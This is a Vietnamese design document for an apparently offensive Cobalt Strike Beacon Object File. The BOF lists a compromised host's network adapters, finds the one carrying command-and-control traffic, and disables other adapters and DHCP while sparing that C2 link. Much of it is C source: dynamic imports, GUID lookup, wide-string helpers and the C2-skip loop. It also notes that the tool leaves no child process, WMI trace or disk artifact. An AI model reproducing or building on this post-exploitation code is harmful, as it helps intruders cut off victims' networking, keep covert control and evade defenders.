DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetBestInterface(IPAddr, PDWORD);
```

Đây là convention của Cobalt Strike BOF. Khi compile:
- Compiler tạo external symbol `__imp_IPHLPAPI$GetBestInterface`
- CS BOF loader scan các symbol có dạng `__imp_DLL$Function`
- Loader gọi `LoadLibraryA("IPHLPAPI")` + `GetProcAddress("GetBestInterface")`
- Patch địa chỉ vào chỗ gọi

Nếu dùng `GetBestInterface` trực tiếp (không có prefix):
- Linker resolve lúc link time → không phù hợp với BOF (không có link stage)
- Import từ IAT của process host → không reliable

---

## Flow hoàn chỉnh: `nic-list 192.168.163.183`

```
1. CNA gọi: beacon_inline_execute(bid, obj_bytes, "go", bof_pack("zi", "192.168.163.183", 2))

2. BOF loader: nạp disable_nic.x64.obj vào memory, resolve imports, gọi go()

3. go():
   parse args → c2ip="192.168.163.183", action=2
   get_c2_guid("192.168.163.183") →
       parse_ipv4() → DWORD addr
       GetBestInterface(addr, &ifIdx) → ifIdx=11
       GetAdaptersAddresses() → tìm IfIndex==11
       → c2Guid="{7550ABB7-...}"
   action_list(c2Guid)

4. action_list():
   GetAdaptersAddresses() → in IP, OperStatus, FriendlyName
   cm_get_net_id_list() →
       CM_Get_Device_ID_List_SizeW (CLASS filter)
       CM_Get_Device_ID_ListW → list device IDs
   for mỗi device:
       CM_Locate_DevNodeW → devInst
       cm_read_net_guid() → đọc NetCfgInstanceId từ registry
       cm_device_state() → ENABLED/DISABLED/UNKNOWN
       BeaconPrintf → in kết quả
   GetIpForwardTable2() → in default routes và /32 routes

5. BeaconPrintf gửi output về CS teamserver → hiện trong CS console
```

---

*Document này mô tả code trong `bof_disable_nic.c` và `bof_dhcp.c`.*
*Mọi thứ chạy in-process trong beacon — không có child process, không có WMI, không có disk artifact.*

---

## File `_w` — Wide-char Variants (`bof_disable_nic_w.c`, `bof_dhcp_w.c`)

Hai file `_w` là bản refactor dùng `WCHAR`/`wchar_t` xuyên suốt thay vì convert sang
`char` sớm. Cơ chế hoạt động giống hệt — chỉ khác ở tầng string.

---

### Vấn đề của bản gốc — `wchar_to_char()` lossy

Bản gốc dùng cast đơn giản:

```c
static void wchar_to_char(const WCHAR *src, char *dst, int dstLen) {
    int i = 0;
    while (src[i] && i < dstLen - 1) { dst[i] = (char)src[i]; i++; }
    dst[i] = '\0';
}
```

Cast `(char)wchar` chỉ lấy byte thấp — đúng với ASCII (GUID, IP), nhưng sai hoàn toàn
với non-ASCII:

```
WCHAR L"Kết nối mạng" (Vietnamese)
→ wchar_to_char()
→ "K\xBFt n\x1Fi m\xE1ng"  ← gibberish
```

---

### Giải pháp — `WideCharToMultiByte` cho output

```c
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int,
    LPSTR, int, LPCCH, LPBOOL);

static void w2a(const WCHAR *src, char *dst, int dstLen) {
    int r = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstLen, NULL, NULL);
    dst[dstLen - 1] = '\0';
    if (r <= 0) dst[0] = '\0';
}
```

`CP_UTF8` (65001) — encode đúng mọi Unicode character thành UTF-8 multi-byte sequence.
`BeaconPrintf` nhận `char *` nhưng Cobalt Strike teamserver handle UTF-8 → hiển thị đúng.

**Chiều ngược lại** (narrow → wide, cho GUID từ `AdapterName`):

```c
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

static void a2w(const char *src, WCHAR *dst, int dstCch) {
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, src, -1, dst, dstCch);
    dst[dstCch - 1] = L'\0';
}
```

`CP_ACP` (0) dùng cho GUID vì `AdapterName` là ASCII — CP_ACP và CP_UTF8 đều cho kết quả giống nhau với ASCII.

---

### Wide string helpers — thay `str_ieq` / `str_has`

**`wstr_ieq`** — so sánh 2 WCHAR string, case-insensitive (chỉ ASCII range A-Z):

```c
static BOOL wstr_ieq(const WCHAR *a, const WCHAR *b) {
    while (*a && *b) {
        WCHAR ca = (*a >= L'a' && *a <= L'z') ? (WCHAR)(*a - 32) : *a;
        WCHAR cb = (*b >= L'a' && *b <= L'z') ? (WCHAR)(*b - 32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return (*a == L'\0' && *b == L'\0');
}
```

Dùng để so sánh `{GUID-A}` với `{guid-a}` — ví dụ GUID từ registry vs GUID từ
`AdapterName`. Cả 2 đều ASCII nên `L'a'-L'z'` range đủ.

**`wstr_has`** — tìm substring trong WCHAR string:

```c
static BOOL wstr_has(const WCHAR *hay, const WCHAR *needle) {
    for (; *hay; hay++) {
        const WCHAR *h = hay, *n = needle;
        while (*h && *n && *h == *n) { h++; n++; }
        if (!*n) return TRUE;
    }
    return FALSE;
}
```

Dùng để tìm `{GUID}` trong `L"\\DEVICE\\TCPIP_{GUID}"` — `find_if_map` không cần convert
sang char trước nữa:

```c
// Bản gốc:
wchar_to_char(Adapter[i].Name, narrow, 512);
if (str_has(narrow, guid)) ...

// Bản _w:
if (wstr_has(Adapter[i].Name, wGuid)) ...   // trực tiếp, không buffer trung gian
```

---

### Dual GUID: `wC2Guid` + `aC2Guid`

Windows IP Helper API có **sự không nhất quán**:

| API | GUID format |
|-----|-------------|
| `GetAdaptersAddresses.AdapterName` | `char *` |
| `GetAdaptersInfo.AdapterName` | `char *` |
| `IP_ADAPTER_INDEX_MAP.Name` | `WCHAR *` (L"\\DEVICE\\TCPIP_{...}") |
| `RegQueryValueExW` (NetCfgInstanceId) | `WCHAR *` |
| `CM_Get_Device_ID_ListW` | `WCHAR *` |

Không thể dùng 1 format cho tất cả → phải giữ 2 bản:

```c
WCHAR wC2Guid[64];  // cho find_if_map (WCHAR Name), wstr_ieq với CM registry
char  aC2Guid[64];  // cho find_ai_by_guid (char* AdapterName), dhcp-check C2 tag

get_c2_guid(c2ip, wC2Guid, 64, aC2Guid, 64, &ifIdx);
//                ↑                ↑
//          filled via a2w()  filled directly from AdapterName
```

`get_c2_guid` fill `aC2Guid` trước (copy trực tiếp từ `AdapterName`), rồi `a2w(aC2Guid,
wC2Guid)` — đảm bảo 2 bản nhất quán với nhau.

---

### `find_if_map` — không cần buffer trung gian

```c
// Bản gốc:
static PIP_ADAPTER_INDEX_MAP find_if_map(PIP_INTERFACE_INFO pIf, const char *guid) {
    char narrow[512];
    for (LONG i = 0; i < pIf->NumAdapters; i++) {
        wchar_to_char(pIf->Adapter[i].Name, narrow, sizeof(narrow));
        if (str_has(narrow, guid)) return &pIf->Adapter[i];
    }
    return NULL;
}

// Bản _w: search WCHAR Name trực tiếp
static PIP_ADAPTER_INDEX_MAP find_if_map(PIP_INTERFACE_INFO pIf, const WCHAR *wGuid) {
    for (LONG i = 0; i < pIf->NumAdapters; i++)
        if (wstr_has(pIf->Adapter[i].Name, wGuid)) return &pIf->Adapter[i];
    return NULL;
}
```

Loại bỏ stack buffer 512 bytes và 1 conversion call mỗi iteration.

---

### Trong `action_dhcp_off` / `action_dhcp_on` — C2 skip dùng WCHAR

```c
for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
    if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;

    // Build wAdapter từ AdapterName (ASCII GUID → WCHAR)
    WCHAR wAdapter[64];
    a2w(a->AdapterName, wAdapter, 64);

    // Skip C2 bằng wstr_ieq (wide comparison, không cần cast)
    if (wstr_ieq(wAdapter, wC2Guid)) { skipped++; continue; }

    // Dùng lại wAdapter cho find_if_map — không cần convert thêm
    PIP_ADAPTER_INDEX_MAP pMap = find_if_map(pIf, wAdapter);
    ...
}
```

Bản gốc skip bằng `str_ieq(a->AdapterName, aC2Guid)` rồi `find_if_map` lại làm
`a2w` lần nữa. Bản `_w` build WCHAR 1 lần, dùng cho cả 2 việc.

---

### Trong `cm_read_net_guid_w` — không cần convert lần nào

Bản gốc `cm_read_net_guid`:
```
RegQueryValueExW → WCHAR → wchar_to_char → char → compare với c2Guid (char)
```

Bản `_w` `cm_read_net_guid_w`:
```
RegQueryValueExW → WCHAR → wstr_ieq với wC2Guid (WCHAR) — không convert
```

```c
static BOOL cm_read_net_guid_w(DEVINST devInst, WCHAR *guidOut, DWORD guidCch) {
    HKEY hKey = NULL;
    if (CFGMGR32$CM_Open_DevNode_Key(..., &hKey, CM_REGISTRY_SOFTWARE) != CR_SUCCESS)
        return FALSE;
    DWORD sz = guidCch * sizeof(WCHAR);
    ADVAPI32$RegQueryValueExW(hKey, L"NetCfgInstanceId", NULL, NULL, (LPBYTE)guidOut, &sz);
    //                                                              ↑ WCHAR array
    ADVAPI32$RegCloseKey(hKey);
    return (guidOut[0] == L'{');
}
```

`RegQueryValueExW` trả về `WCHAR` thẳng vào buffer — zero conversion, đúng nhất.

---

### Summary — sự khác biệt theo layer

```
Layer                │ Bản gốc                  │ Bản _w
─────────────────────┼──────────────────────────┼──────────────────────────
Windows API output   │ WCHAR (cfgmgr32, reg)    │ WCHAR (giống)
String so sánh       │ convert → char, str_ieq  │ WCHAR trực tiếp, wstr_ieq
Tìm trong Name field │ convert → narrow, str_has│ wstr_has trực tiếp
In ra output         │ (char)wchar cast (lossy) │ WideCharToMultiByte (UTF-8)
Non-ASCII support    │ Sai (gibberish)           │ Đúng (tiếng Việt, Hoa, etc.)
C2 GUID so sánh      │ char aC2Guid only         │ wC2Guid + aC2Guid (dual)
```
